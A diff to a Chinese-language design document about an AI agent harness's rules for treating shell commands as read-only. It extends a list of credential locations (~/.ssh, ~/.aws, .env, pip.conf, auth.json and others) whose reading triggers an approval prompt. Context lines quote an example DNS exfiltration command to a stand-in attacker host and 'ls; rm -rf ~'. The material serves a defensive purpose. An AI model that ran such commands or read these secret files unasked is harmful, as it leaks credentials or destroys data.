@@ -210,10 +210,15 @@ MCP 的调用也会停下来等你批准。
    一条能联网的"只读"命令，能把另一条刚读到的东西送出去，连要查的域名本身都能带走数据（`ping <密钥>.attacker.example`）。
 3. **看路径**（[paths.py](../../harness/commands/paths.py)）。每一个词都当作可能的路径（选项的值、`git show HEAD:.env` 里 `HEAD:` 后面的部分也算），
    顺着符号链接找到真正的位置，比较时不分大小写，因为 macOS 上 `.ENV` 就是 `.env`。读智狐的密钥文件、`data/`、
-   看起来存着密钥的地方（`~/.ssh`、`~/.aws`、`.env*`、`*.pem`、`id_rsa*`、`*credential*`、shell 的历史记录、`.git/config`、
-   `/proc/*/environ`、`/dev`），哪怕只是 `cat`，也照常问。会读整个文件夹的命令（`grep -r`、`rg`、两个文件夹的 `diff`），
+   看起来存着密钥的地方（`~/.ssh`、`~/.aws`、`~/.gitconfig`、`~/.m2/settings.xml`、`.env*`、`*.pem`、`id_rsa*`、`*credential*`、
+   `auth.json`、`pip.conf`、shell 的历史记录、`.git/config`、`/proc/*/environ`、`/dev`），哪怕只是 `cat`，也照常问。
+   这些地方的名单在 [harness/secret_places.py](../../harness/secret_places.py)，和[沙箱](sandbox-and-hooks.md#命令的沙箱命令只碰得到该碰的地方)共用一份：
+   沙箱挡着的家目录里的每一处，这里一样认；这里还按名字认（任何地方叫 `id_rsa` 的文件），沙箱做不到。
+   名字太普通、单看说明不了什么的（`token`、`config.yml`、`settings.xml`），只在家目录下的那一处才算，
+   所以在项目里 `cat settings.xml` 照样只是看。会读整个文件夹的命令（`grep -r`、`rg`、两个文件夹的 `diff`），
    文件夹里面有这些、有指向别的文件夹的符号链接、或者大得看不完（`READONLY_SCAN_ENTRIES`），也问；
-   只列名字的（`find`、`ls -R`、`du`、`tree`），文件夹里面有 `data/` 就问。
+   只列名字的（`find`、`ls -R`、`du`、`tree`），文件夹里面有 `data/` 或者家目录里那些存着密钥的地方就问
+   （`du -sh ~/.cache` 里面有 Hugging Face 的 token）。
 4. **管道和连起来的几段。** `ps aux | grep nginx`、`ls src; git status && git diff` 只有在每一段单独看都是只读的时候才算，
    所以 `ls; rm -rf ~` 照样问。`cd` 不在名单里，所以换了目录的一串也问：后面的命令会在另一个地方跑，和检查路径的地方对不上。
 
